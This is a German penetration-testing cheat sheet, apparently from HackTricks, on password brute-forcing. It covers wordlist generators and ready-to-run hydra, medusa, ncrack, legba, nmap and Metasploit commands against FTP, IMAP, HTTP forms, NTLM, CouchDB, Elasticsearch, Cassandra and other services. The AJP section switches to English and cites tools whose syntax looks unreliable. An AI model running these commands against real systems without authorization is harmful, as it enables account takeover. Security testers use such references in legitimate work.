# Brute Force - Spickzettel

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Verwenden Sie [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), um Workflows einfach zu erstellen und zu automatisieren, die von den fortschrittlichsten Community-Tools der Welt unterstützt werden.\
Erhalten Sie noch heute Zugriff:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Lernen Sie das Hacken von AWS von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositories senden.

</details>

## Standardanmeldeinformationen

**Suchen Sie in Google** nach den Standardanmeldeinformationen der verwendeten Technologie oder **probieren Sie diese Links aus**:

* [**https://github.com/ihebski/DefaultCreds-cheat-sheet**](https://github.com/ihebski/DefaultCreds-cheat-sheet)
* [**http://www.phenoelit.org/dpl/dpl.html**](http://www.phenoelit.org/dpl/dpl.html)
* [**http://www.vulnerabilityassessment.co.uk/passwordsC.htm**](http://www.vulnerabilityassessment.co.uk/passwordsC.htm)
* [**https://192-168-1-1ip.mobi/default-router-passwords-list/**](https://192-168-1-1ip.mobi/default-router-passwords-list/)
* [**https://datarecovery.com/rd/default-passwords/**](https://datarecovery.com/rd/default-passwords/)
* [**https://bizuns.com/default-passwords-list**](https://bizuns.com/default-passwords-list)
* [**https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv**](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv)
* [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
* [**https://www.cirt.net/passwords**](https://www.cirt.net/passwords)
* [**http://www.passwordsdatabase.com/**](http://www.passwordsdatabase.com)
* [**https://many-passwords.github.io/**](https://many-passwords.github.io)
* [**https://theinfocentric.com/**](https://theinfocentric.com/)

## **Erstellen Sie Ihre eigenen Wörterbücher**

Finden Sie so viele Informationen wie möglich über das Ziel und generieren Sie ein benutzerdefiniertes Wörterbuch. Tools, die Ihnen dabei helfen können:

### Crunch
```bash
crunch 4 6 0123456789ABCDEF -o crunch1.txt #From length 4 to 6 using that alphabet
crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha # Only length 4 using charset mixalpha (inside file charset.lst)

@ Lower case alpha characters
, Upper case alpha characters
% Numeric characters
^ Special characters including spac
crunch 6 8 -t ,@@^^%%
```
### Cewl

Cewl ist ein Befehlszeilentool, das verwendet wird, um benutzerdefinierte Wörterlisten aus einer Website oder einem Textdokument zu generieren. Es kann hilfreich sein, wenn Sie eine Brute-Force- oder Wörterbuchangriffsmethode anwenden möchten.

Die Verwendung von Cewl ist einfach. Geben Sie einfach den Befehl `cewl` gefolgt von der URL der Website oder dem Pfad zur Textdatei ein. Das Tool durchsucht dann den Inhalt und extrahiert alle Wörter, die den angegebenen Kriterien entsprechen.

Sie können auch verschiedene Optionen verwenden, um die Ausgabe anzupassen. Zum Beispiel können Sie die Mindestlänge der extrahierten Wörter festlegen oder bestimmte Zeichen ausschließen.

Cewl ist ein nützliches Werkzeug, um benutzerdefinierte Wörterlisten für Brute-Force-Angriffe zu generieren. Es kann Ihnen helfen, potenzielle Passwörter oder Benutzernamen zu identifizieren, die auf einer Website verwendet werden könnten.
```bash
cewl example.com -m 5 -w words.txt
```
### [CUPP](https://github.com/Mebus/cupp)

Generiere Passwörter basierend auf deinem Wissen über das Opfer (Namen, Daten...)
```
python3 cupp.py -h
```
### [Wister](https://github.com/cycurity/wister)

Ein Tool zur Generierung von Wortlisten, das es Ihnen ermöglicht, eine Reihe von Wörtern bereitzustellen und Ihnen die Möglichkeit gibt, mehrere Variationen aus den gegebenen Wörtern zu erstellen. Dadurch entsteht eine einzigartige und ideale Wortliste, die im Hinblick auf ein bestimmtes Ziel verwendet werden kann.
```bash
python3 wister.py -w jane doe 2022 summer madrid 1998 -c 1 2 3 4 5 -o wordlist.lst

__          _______  _____ _______ ______ _____
\ \        / /_   _|/ ____|__   __|  ____|  __ \
\ \  /\  / /  | | | (___    | |  | |__  | |__) |
\ \/  \/ /   | |  \___ \   | |  |  __| |  _  /
\  /\  /   _| |_ ____) |  | |  | |____| | \ \
\/  \/   |_____|_____/   |_|  |______|_|  \_\

Version 1.0.3                    Cycurity

Generating wordlist...
[########################################] 100%
Generated 67885 lines.

Finished in 0.920s.
```
### [pydictor](https://github.com/LandGrey/pydictor)

### Wortlisten

* [**https://github.com/danielmiessler/SecLists**](https://github.com/danielmiessler/SecLists)
* [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
* [**https://github.com/kaonashi-passwords/Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi)
* [**https://github.com/google/fuzzing/tree/master/dictionaries**](https://github.com/google/fuzzing/tree/master/dictionaries)
* [**https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm**](https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm)
* [**https://weakpass.com/wordlist/**](https://weakpass.com/wordlist/)
* [**https://wordlists.assetnote.io/**](https://wordlists.assetnote.io/)
* [**https://github.com/fssecur3/fuzzlists**](https://github.com/fssecur3/fuzzlists)
* [**https://hashkiller.io/listmanager**](https://hashkiller.io/listmanager)
* [**https://github.com/Karanxa/Bug-Bounty-Wordlists**](https://github.com/Karanxa/Bug-Bounty-Wordlists)

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Verwenden Sie [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), um Workflows einfach zu erstellen und zu automatisieren, die von den fortschrittlichsten Community-Tools der Welt unterstützt werden.\
Erhalten Sie noch heute Zugriff:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Dienste

Alphabetisch nach Dienstnamen geordnet.

### AFP
```bash
nmap -p 548 --script afp-brute <IP>
msf> use auxiliary/scanner/afp/afp_login
msf> set BLANK_PASSWORDS true
msf> set USER_AS_PASS true
msf> set PASS_FILE <PATH_PASSWDS>
msf> set USER_FILE <PATH_USERS>
msf> run
```
### AJP

AJP (Apache JServ Protocol) is a protocol used by Apache Tomcat to communicate with web servers. It is similar to the HTTP protocol but is more efficient for communication between the web server and the application server.

#### Brute Forcing AJP

To brute force AJP, you can use tools like `ajpfuzzer` or `ajp-buster`. These tools allow you to test for weak credentials or vulnerabilities in the AJP protocol.

Here is an example of how to use `ajpfuzzer`:

```bash
ajpfuzzer -H <target_host> -p <target_port> -u <username> -w <wordlist>
```

Replace `<target_host>` with the IP address or hostname of the target server, `<target_port>` with the AJP port (usually 8009), `<username>` with the username you want to test, and `<wordlist>` with the path to a wordlist file containing possible passwords.

Similarly, you can use `ajp-buster` with the following command:

```bash
ajp-buster -u <target_url> -w <wordlist>
```

Replace `<target_url>` with the URL of the target server and `<wordlist>` with the path to a wordlist file containing possible usernames and passwords.

Remember to always obtain proper authorization before performing any brute force attacks.
```bash
nmap --script ajp-brute -p 8009 <IP>
```
## AMQP (ActiveMQ, RabbitMQ, Qpid, JORAM und Solace)

AMQP (Advanced Message Queuing Protocol) ist ein offenes Netzwerkprotokoll, das für die Nachrichtenübermittlung zwischen Anwendungen verwendet wird. Es wird von verschiedenen Message-Brokern wie ActiveMQ, RabbitMQ, Qpid, JORAM und Solace unterstützt.

### Brute-Force-Angriff auf AMQP

Ein Brute-Force-Angriff auf AMQP beinhaltet das systematische Ausprobieren verschiedener Kombinationen von Benutzernamen und Passwörtern, um Zugriff auf das AMQP-System zu erlangen. Dies kann mithilfe von Tools wie Hydra oder Burp Suite durchgeführt werden.

#### Hydra

Hydra ist ein leistungsstarkes Tool für Brute-Force-Angriffe, das verschiedene Protokolle unterstützt, einschließlich AMQP. Es kann verwendet werden, um Benutzernamen und Passwörter aus einer vordefinierten Liste auszuprobieren.

Beispielbefehl:

```plaintext
hydra -L users.txt -P passwords.txt amqp://<IP>:<Port>
```

#### Burp Suite

Burp Suite ist eine umfassende Suite von Tools für Webanwendungssicherheitstests. Es enthält auch einen Brute-Force-Scanner, der für AMQP-Angriffe verwendet werden kann. Der Scanner kann konfiguriert werden, um verschiedene Benutzernamen und Passwörter auszuprobieren.

### Schutzmaßnahmen gegen Brute-Force-Angriffe auf AMQP

Um Brute-Force-Angriffe auf AMQP zu verhindern, sollten folgende Schutzmaßnahmen ergriffen werden:

- Verwenden Sie starke und eindeutige Passwörter für AMQP-Benutzerkonten.
- Begrenzen Sie die Anzahl der fehlgeschlagenen Anmeldeversuche und sperren Sie Benutzerkonten nach einer bestimmten Anzahl von Fehlversuchen.
- Implementieren Sie eine Zwei-Faktor-Authentifizierung für AMQP-Benutzerkonten.
- Überwachen Sie die AMQP-Protokolldateien auf verdächtige Aktivitäten und ungewöhnliche Anmeldeversuche.
- Aktualisieren Sie regelmäßig die AMQP-Software, um bekannte Sicherheitslücken zu schließen.

Durch die Umsetzung dieser Schutzmaßnahmen können Brute-Force-Angriffe auf AMQP effektiv verhindert werden.
```bash
legba amqp --target localhost:5672 --username admin --password data/passwords.txt [--amql-ssl]
```
### Cassandra

Cassandra ist ein weit verbreitetes verteiltes Datenbankmanagementsystem, das für seine hohe Skalierbarkeit und Ausfallsicherheit bekannt ist. Es basiert auf dem NoSQL-Datenbankmodell und wurde entwickelt, um große Datenmengen über mehrere Knoten hinweg zu speichern und zu verarbeiten.

#### Brute-Force-Angriffe auf Cassandra

Brute-Force-Angriffe sind eine gängige Methode, um Zugriff auf ein Cassandra-Datenbanksystem zu erlangen, indem systematisch verschiedene Kombinationen von Benutzernamen und Passwörtern ausprobiert werden. Diese Angriffe können entweder online oder offline durchgeführt werden.

##### Online-Brute-Force-Angriffe

Bei einem Online-Brute-Force-Angriff wird versucht, sich über die öffentliche Schnittstelle des Cassandra-Systems anzumelden. Der Angreifer verwendet eine Liste von Benutzernamen und Passwörtern und versucht, sich mit jedem Eintrag anzumelden, bis er erfolgreich ist. Um solche Angriffe zu verhindern, sollten starke Passwörter verwendet und die Anzahl der Anmeldeversuche begrenzt werden.

##### Offline-Brute-Force-Angriffe

Bei einem Offline-Brute-Force-Angriff versucht der Angreifer, die Passwörter aus einer gestohlenen Datenbank oder einem Hash-Datei zu knacken. Der Angreifer verwendet spezielle Tools und Techniken, um die Passwörter zu entschlüsseln. Um solche Angriffe zu erschweren, sollten starke Passwortrichtlinien implementiert und die Passwörter mit sicheren Hash-Algorithmen gehasht werden.

##### Schutzmaßnahmen gegen Brute-Force-Angriffe

Um sich vor Brute-Force-Angriffen auf Cassandra zu schützen, sollten folgende Maßnahmen ergriffen werden:

- Verwenden Sie starke Passwörter, die aus einer Kombination von Groß- und Kleinbuchstaben, Zahlen und Sonderzeichen bestehen.
- Begrenzen Sie die Anzahl der Anmeldeversuche, um die Ausführung von Brute-Force-Angriffen zu verlangsamen.
- Implementieren Sie eine Zwei-Faktor-Authentifizierung, um die Sicherheit der Anmeldung weiter zu erhöhen.
- Überwachen Sie die Anmeldeaktivitäten und setzen Sie Alarme, um verdächtige Aktivitäten zu erkennen.
- Aktualisieren Sie regelmäßig die Cassandra-Software, um bekannte Sicherheitslücken zu schließen.

Durch die Umsetzung dieser Schutzmaßnahmen können Brute-Force-Angriffe auf Cassandra erschwert oder verhindert werden. Es ist wichtig, die Sicherheit des Datenbanksystems kontinuierlich zu überwachen und bei Bedarf weitere Sicherheitsmaßnahmen zu ergreifen.
```bash
nmap --script cassandra-brute -p 9160 <IP>
# legba ScyllaDB / Apache Casandra
legba scylla --username cassandra --password wordlists/passwords.txt --target localhost:9042
```
### CouchDB

CouchDB ist eine Open-Source-Datenbank, die auf dem Apache-Projekt basiert. Sie verwendet das JSON-Dokumentenmodell und bietet eine RESTful-Schnittstelle für den Zugriff auf die Daten. CouchDB unterstützt auch die Replikation, um Daten zwischen verschiedenen Instanzen zu synchronisieren.

#### Brute-Force-Angriff auf CouchDB

Ein Brute-Force-Angriff auf CouchDB beinhaltet das systematische Ausprobieren verschiedener Kombinationen von Benutzernamen und Passwörtern, um Zugriff auf die Datenbank zu erlangen. Dies kann durch automatisierte Skripte oder Tools erfolgen, die speziell für Brute-Force-Angriffe entwickelt wurden.

Um einen Brute-Force-Angriff auf CouchDB durchzuführen, können Sie Tools wie Hydra oder Medusa verwenden. Diese Tools ermöglichen es Ihnen, eine Liste von Benutzernamen und Passwörtern zu erstellen und diese automatisch auszuprobieren, um die richtigen Anmeldeinformationen zu finden.

Es ist wichtig zu beachten, dass Brute-Force-Angriffe illegal sind, es sei denn, Sie haben die ausdrückliche Erlaubnis des Eigentümers der CouchDB-Datenbank, den Angriff durchzuführen. Es ist auch wichtig, starke Passwörter zu verwenden und regelmäßig zu ändern, um sich vor Brute-Force-Angriffen zu schützen.

#### Schutz vor Brute-Force-Angriffen auf CouchDB

Um sich vor Brute-Force-Angriffen auf CouchDB zu schützen, gibt es mehrere Maßnahmen, die Sie ergreifen können:

- Verwenden Sie starke Passwörter: Verwenden Sie Passwörter, die aus einer Kombination von Groß- und Kleinbuchstaben, Zahlen und Sonderzeichen bestehen. Vermeiden Sie einfache Wörter oder persönliche Informationen.

- Begrenzen Sie die Anzahl der Anmeldeversuche: Konfigurieren Sie CouchDB so, dass nach einer bestimmten Anzahl von fehlgeschlagenen Anmeldeversuchen ein Konto gesperrt wird oder eine Verzögerung zwischen den Anmeldeversuchen eingeführt wird.

- Verwenden Sie Zwei-Faktor-Authentifizierung: Aktivieren Sie die Zwei-Faktor-Authentifizierung für den Zugriff auf CouchDB. Dadurch wird eine zusätzliche Sicherheitsebene hinzugefügt, da ein Angreifer nicht nur das Passwort, sondern auch einen zweiten Faktor (z. B. einen Sicherheitscode auf dem Mobiltelefon) benötigt.

- Aktualisieren Sie regelmäßig: Stellen Sie sicher, dass Sie die neuesten Updates und Patches für CouchDB installieren, um bekannte Sicherheitslücken zu schließen.

- Überwachen Sie die Protokolle: Überwachen Sie die Protokolle von CouchDB auf verdächtige Aktivitäten, wie z. B. wiederholte fehlgeschlagene Anmeldeversuche, um potenzielle Brute-Force-Angriffe zu erkennen.

Indem Sie diese Maßnahmen ergreifen, können Sie das Risiko von Brute-Force-Angriffen auf CouchDB verringern und die Sicherheit Ihrer Datenbank verbessern.
```bash
msf> use auxiliary/scanner/couchdb/couchdb_login
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 5984 http-get /
```
### Docker-Registrierung

Die Docker-Registrierung ist ein Dienst, der es Benutzern ermöglicht, Docker-Images zu speichern und zu verteilen. Es handelt sich um eine zentrale Speicherstelle für Docker-Images, ähnlich einem Repository. Die Docker-Registrierung kann entweder öffentlich oder privat sein.

#### Brute-Force-Angriff auf die Docker-Registrierung

Ein Brute-Force-Angriff auf die Docker-Registrierung beinhaltet das systematische Ausprobieren verschiedener Kombinationen von Benutzernamen und Passwörtern, um Zugriff auf die Registrierung zu erlangen. Dies kann durch automatisierte Skripte oder Tools erfolgen, die speziell für Brute-Force-Angriffe entwickelt wurden.

#### Gegenmaßnahmen

Um Brute-Force-Angriffe auf die Docker-Registrierung zu verhindern, können folgende Maßnahmen ergriffen werden:

- Verwendung starker Passwörter: Verwenden Sie komplexe Passwörter, die aus einer Kombination von Groß- und Kleinbuchstaben, Zahlen und Sonderzeichen bestehen.
- Aktivierung der Zwei-Faktor-Authentifizierung (2FA): Durch die Aktivierung der 2FA wird ein zusätzlicher Sicherheitsschritt hinzugefügt, der den Zugriff auf die Registrierung erschwert.
- Begrenzung der Anzahl der Anmeldeversuche: Durch die Begrenzung der Anzahl der Anmeldeversuche wird die Anzahl der möglichen Versuche bei einem Brute-Force-Angriff begrenzt.
- Überwachung der Registrierungsaktivitäten: Durch die Überwachung der Registrierungsaktivitäten können verdächtige Aktivitäten erkannt und entsprechende Maßnahmen ergriffen werden.

Es ist wichtig, diese Gegenmaßnahmen zu implementieren, um die Sicherheit der Docker-Registrierung zu gewährleisten und unbefugten Zugriff zu verhindern.
```
hydra -L /usr/share/brutex/wordlists/simple-users.txt  -P /usr/share/brutex/wordlists/password.lst 10.10.10.10 -s 5000 https-get /v2/
```
### Elasticsearch

Elasticsearch ist eine Open-Source-Suchmaschine, die auf der Lucene-Bibliothek basiert. Sie wird häufig für die Indizierung und Suche von großen Mengen strukturierter und unstrukturierter Daten verwendet. Elasticsearch bietet eine leistungsstarke Abfragesprache und ermöglicht die Echtzeit-Suche und Analyse von Daten.

#### Brute-Force-Angriffe auf Elasticsearch

Brute-Force-Angriffe auf Elasticsearch sind eine gängige Methode, um Zugriff auf ungeschützte oder schwach geschützte Elasticsearch-Instanzen zu erlangen. Bei einem Brute-Force-Angriff versucht ein Angreifer, sich durch Ausprobieren verschiedener Kombinationen von Benutzernamen und Passwörtern Zugriff auf das System zu verschaffen.

Um einen Brute-Force-Angriff auf Elasticsearch durchzuführen, können verschiedene Tools und Skripte verwendet werden. Ein beliebtes Tool ist Hydra, das Benutzernamen und Passwörter aus einer vordefinierten Liste ausprobiert. Ein weiteres Tool ist Burp Suite, das HTTP-Anfragen abfangen und manipulieren kann, um Brute-Force-Angriffe durchzuführen.

Es ist wichtig, Elasticsearch-Instanzen angemessen zu schützen, um Brute-Force-Angriffe zu verhindern. Dazu gehören Maßnahmen wie die Verwendung starker Passwörter, die Aktivierung der Authentifizierung und Autorisierung, die Begrenzung der Anzahl der Anmeldeversuche und die Überwachung von Angriffsversuchen.

#### Schutz vor Brute-Force-Angriffen auf Elasticsearch

Um sich vor Brute-Force-Angriffen auf Elasticsearch zu schützen, sollten folgende Maßnahmen ergriffen werden:

- Verwenden Sie starke Passwörter für den Zugriff auf Elasticsearch.
- Aktivieren Sie die Authentifizierung und Autorisierung in Elasticsearch.
- Begrenzen Sie die Anzahl der Anmeldeversuche, um wiederholte Brute-Force-Angriffe zu verhindern.
- Überwachen Sie die Anmeldungsversuche und suchen Sie nach verdächtigen Aktivitäten.
- Aktualisieren Sie regelmäßig Elasticsearch, um bekannte Sicherheitslücken zu schließen.
- Verwenden Sie eine Firewall, um den Zugriff auf Elasticsearch von nicht vertrauenswürdigen IP-Adressen zu blockieren.
- Implementieren Sie Sicherheitsrichtlinien und Schulungen für Mitarbeiter, um das Bewusstsein für Sicherheitsrisiken zu schärfen.

Durch die Umsetzung dieser Schutzmaßnahmen können Brute-Force-Angriffe auf Elasticsearch effektiv verhindert werden. Es ist wichtig, die Sicherheit von Elasticsearch-Instanzen regelmäßig zu überprüfen und sicherzustellen, dass alle erforderlichen Sicherheitsvorkehrungen getroffen wurden.
```
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 9200 http-get /
```
### FTP

FTP (File Transfer Protocol) ist ein weit verbreitetes Netzwerkprotokoll, das für den Austausch von Dateien zwischen einem Client und einem Server verwendet wird. Es ermöglicht Benutzern, Dateien von einem Computer auf einen anderen zu übertragen.

#### Brute-Force-Angriff auf FTP

Ein Brute-Force-Angriff auf FTP beinhaltet das systematische Ausprobieren aller möglichen Kombinationen von Benutzernamen und Passwörtern, um Zugriff auf ein FTP-Konto zu erlangen. Dieser Angriff kann mithilfe von speziellen Tools automatisiert werden, die eine große Anzahl von Anmeldeversuchen in kurzer Zeit durchführen können.

#### Schutzmaßnahmen gegen Brute-Force-Angriffe auf FTP

Um sich vor Brute-Force-Angriffen auf FTP zu schützen, können folgende Maßnahmen ergriffen werden:

- Verwenden Sie starke Passwörter, die aus einer Kombination von Groß- und Kleinbuchstaben, Zahlen und Sonderzeichen bestehen.
- Begrenzen Sie die Anzahl der fehlgeschlagenen Anmeldeversuche, bevor ein Konto gesperrt wird.
- Aktivieren Sie die Zwei-Faktor-Authentifizierung, um zusätzliche Sicherheitsebenen hinzuzufügen.
- Überwachen Sie die Anmeldeaktivitäten und setzen Sie Alarme für verdächtige Aktivitäten.
- Aktualisieren Sie regelmäßig die FTP-Software, um bekannte Sicherheitslücken zu schließen.

#### Tools für Brute-Force-Angriffe auf FTP

Es gibt verschiedene Tools, die für Brute-Force-Angriffe auf FTP verwendet werden können, darunter:

- Hydra: Ein leistungsstarkes Tool, das verschiedene Protokolle unterstützt, einschließlich FTP.
- Medusa: Ein weiteres Tool, das für Brute-Force-Angriffe auf verschiedene Protokolle verwendet werden kann, einschließlich FTP.
- Ncrack: Ein Netzwerk-Authentifizierungscrack-Tool, das auch für Brute-Force-Angriffe auf FTP verwendet werden kann.

Es ist wichtig zu beachten, dass das Durchführen von Brute-Force-Angriffen auf Systeme oder Konten, für die Sie keine Berechtigung haben, illegal ist und strafrechtliche Konsequenzen haben kann. Brute-Force-Angriffe sollten nur im Rahmen einer rechtmäßigen Penetrationstestaktivität durchgeführt werden.
```bash
hydra -l root -P passwords.txt [-t 32] <IP> ftp
ncrack -p 21 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M ftp
legba ftp --username admin --password wordlists/passwords.txt --target localhost:21
```
### HTTP Generisches Brute-Force

#### [**WFuzz**](../pentesting-web/web-tool-wfuzz.md)

### HTTP Basic Auth
```bash
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst sizzle.htb.local http-get /certsrv/
# Use https-get mode for https
medusa -h <IP> -u <username> -P  <passwords.txt> -M  http -m DIR:/path/to/auth -T 10
legba http.basic --username admin --password wordlists/passwords.txt --target http://localhost:8888/
```
### HTTP - NTLM

NTLM (NT LAN Manager) ist ein Authentifizierungsprotokoll, das in Microsoft Windows-Systemen verwendet wird. Es ermöglicht die Überprüfung der Identität eines Benutzers, indem es eine Herausforderung-Response-Methode verwendet.

#### Brute-Force-Angriff auf NTLM

Ein Brute-Force-Angriff auf NTLM beinhaltet das systematische Ausprobieren aller möglichen Passwortkombinationen, um das richtige Passwort zu erraten. Dieser Angriff kann auf verschiedene Weisen durchgeführt werden:

1. Wörterbuchangriff: Hierbei werden Passwörter aus einer vordefinierten Wörterbuchliste ausprobiert. Diese Methode ist schnell, aber nur effektiv, wenn das richtige Passwort in der Wörterbuchliste enthalten ist.

2. Kombinatorischer Angriff: Bei dieser Methode werden verschiedene Wörterbuchlisten kombiniert, um eine größere Anzahl von Passwortkombinationen abzudecken. Dies erhöht die Erfolgschancen im Vergleich zum reinen Wörterbuchangriff.

3. Brute-Force-Angriff mit Regeln: Hierbei werden Regeln angewendet, um die Passwortkombinationen zu generieren. Diese Regeln können beispielsweise die Verwendung von Zahlen, Sonderzeichen oder Groß- und Kleinschreibung vorschreiben.

#### Gegenmaßnahmen

Um sich vor Brute-Force-Angriffen auf NTLM zu schützen, können folgende Maßnahmen ergriffen werden:

1. Verwendung starker Passwörter: Benutzer sollten komplexe Passwörter verwenden, die aus einer Kombination von Groß- und Kleinbuchstaben, Zahlen und Sonderzeichen bestehen.

2. Kontosperrung: Nach einer bestimmten Anzahl von fehlgeschlagenen Anmeldeversuchen sollte das Konto vorübergehend gesperrt werden, um Brute-Force-Angriffe zu verhindern.

3. Verwendung von Zwei-Faktor-Authentifizierung: Durch die Implementierung einer zusätzlichen Sicherheitsebene, wie z.B. einer SMS-Verifizierung oder eines Hardware-Token, kann die Sicherheit des Authentifizierungsprozesses erhöht werden.

4. Überwachung der Anmeldeversuche: Das Überwachen und Protokollieren von Anmeldeversuchen kann dazu beitragen, verdächtige Aktivitäten zu erkennen und darauf zu reagieren.

Es ist wichtig, diese Gegenmaßnahmen zu implementieren, um die Sicherheit des NTLM-Authentifizierungsprotokolls zu gewährleisten und Brute-Force-Angriffe zu verhindern.
```bash
legba http.ntlm1 --domain example.org --workstation client --username admin --password wordlists/passwords.txt --target https://localhost:8888/
legba http.ntlm2 --domain example.org --workstation client --username admin --password wordlists/passwords.txt --target https://localhost:8888/
```
### HTTP - Post Form

Eine häufige Methode, um Benutzeranmeldeinformationen zu erlangen, besteht darin, eine Brute-Force-Attacke auf ein HTTP-Formular durchzuführen. Bei dieser Methode werden verschiedene Kombinationen von Benutzernamen und Passwörtern ausprobiert, um Zugriff auf das Konto zu erlangen.

Um eine Brute-Force-Attacke auf ein HTTP-Formular durchzuführen, sind folgende Schritte erforderlich:

1. Identifizieren Sie das Ziel-HTTP-Formular, das Benutzeranmeldeinformationen erfordert.
2. Erfassen Sie die HTTP-Anforderung, die beim Absenden des Formulars gesendet wird.
3. Analysieren Sie die HTTP-Anforderung, um die erforderlichen Parameter zu identifizieren.
4. Erstellen Sie ein Skript oder verwenden Sie ein Tool, um verschiedene Kombinationen von Benutzernamen und Passwörtern zu senden.
5. Überwachen Sie die HTTP-Antworten, um festzustellen, ob eine erfolgreiche Anmeldung erzielt wurde.
6. Wiederholen Sie den Vorgang, bis das richtige Benutzerkonto gefunden wurde.

Es ist wichtig, dass bei der Durchführung einer Brute-Force-Attacke Vorsicht walten gelassen wird, da dies eine illegale Aktivität sein kann. Es ist ratsam, diese Technik nur in einer autorisierten Umgebung oder mit ausdrücklicher Zustimmung des Eigentümers des Zielsystems anzuwenden.
```bash
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst domain.htb  http-post-form "/path/index.php:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V
# Use https-post-form mode for https
```
Für http**s** müssen Sie von "http-post-form" zu "**https-post-form"** wechseln.

### **HTTP - CMS --** (W)ordpress, (J)oomla oder (D)rupal oder (M)oodle
```bash
cmsmap -f W/J/D/M -u a -p a https://wordpress.com
# Check also https://github.com/evilsocket/legba/wiki/HTTP
```
### IMAP

IMAP (Internet Message Access Protocol) ist ein Protokoll, das zum Abrufen von E-Mails von einem E-Mail-Server verwendet wird. Es ermöglicht Benutzern den Zugriff auf ihre E-Mails, ohne sie auf ihren lokalen Geräten herunterladen zu müssen. IMAP bietet Funktionen wie das Durchsuchen von E-Mail-Ordnern, das Markieren von E-Mails als gelesen oder ungelesen, das Löschen von E-Mails und das Verschieben von E-Mails zwischen Ordnern.

#### Brute-Force-Angriff auf IMAP

Ein Brute-Force-Angriff auf IMAP beinhaltet das systematische Ausprobieren verschiedener Kombinationen von Benutzernamen und Passwörtern, um Zugriff auf ein IMAP-Konto zu erlangen. Dieser Angriff kann entweder manuell oder mithilfe von automatisierten Tools durchgeführt werden.

##### Manueller Brute-Force-Angriff auf IMAP

Bei einem manuellen Brute-Force-Angriff auf IMAP versucht der Angreifer, sich über eine IMAP-Verbindung mit dem E-Mail-Server zu verbinden und verschiedene Benutzernamen und Passwörter auszuprobieren, um Zugriff auf das Konto zu erhalten. Dies erfordert Zeit und Geduld, da der Angreifer jede Kombination manuell eingeben muss.

##### Automatisierter Brute-Force-Angriff auf IMAP

Ein automatisierter Brute-Force-Angriff auf IMAP wird mithilfe von Tools durchgeführt, die speziell für diesen Zweck entwickelt wurden. Diese Tools können eine Liste von Benutzernamen und Passwörtern verwenden und automatisch versuchen, sich mit dem IMAP-Server zu verbinden. Der Vorteil dieser Methode besteht darin, dass sie den Angriff beschleunigt und die Wahrscheinlichkeit erhöht, dass ein gültiger Benutzername und ein gültiges Passwort gefunden werden.

##### Schutz vor Brute-Force-Angriffen auf IMAP

Um sich vor Brute-Force-Angriffen auf IMAP zu schützen, können verschiedene Maßnahmen ergriffen werden:

- Verwendung von starken Passwörtern: Verwenden Sie komplexe Passwörter, die aus einer Kombination von Groß- und Kleinbuchstaben, Zahlen und Sonderzeichen bestehen.
- Implementierung von Kontosperrungen: Begrenzen Sie die Anzahl der fehlgeschlagenen Anmeldeversuche und sperren Sie das Konto für eine bestimmte Zeit, wenn eine bestimmte Anzahl von Fehlversuchen erreicht ist.
- Verwendung von Zwei-Faktor-Authentifizierung (2FA): Aktivieren Sie die 2FA, um eine zusätzliche Sicherheitsebene hinzuzufügen. Dadurch wird ein zusätzlicher Code benötigt, um sich anzumelden, selbst wenn das Passwort kompromittiert wurde.
- Überwachung von Anmeldeversuchen: Überwachen Sie die Anmeldeversuche auf verdächtige Aktivitäten und ergreifen Sie entsprechende Maßnahmen, wenn ein Brute-Force-Angriff erkannt wird.

Es ist wichtig, diese Schutzmaßnahmen zu implementieren, um die Sicherheit von IMAP-Konten zu gewährleisten und Brute-Force-Angriffe zu verhindern.
```bash
hydra -l USERNAME -P /path/to/passwords.txt -f <IP> imap -V
hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 993 -f <IP> imap -V
nmap -sV --script imap-brute -p <PORT> <IP>
legba imap --username user --password data/passwords.txt --target localhost:993
```
